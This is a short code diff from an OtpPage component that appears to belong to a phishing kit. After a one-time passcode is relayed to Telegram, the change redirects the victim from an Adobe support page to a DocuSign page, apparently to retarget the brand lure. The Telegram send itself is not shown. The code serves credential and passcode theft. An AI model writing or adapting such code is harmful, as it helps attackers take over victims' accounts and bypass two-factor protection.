@@ -53,7 +53,7 @@ export default function OtpPage() {
       setLoading(false);
 
       if (telegramResponse.ok) {
-        window.location.href = "https://helpx.adobe.com/support.html";
+        window.location.href = "https://www.docusign.com/ip";
       } else {
         const data = await telegramResponse.json();
         setError(data.description || "Failed to send OTP to Telegram.");
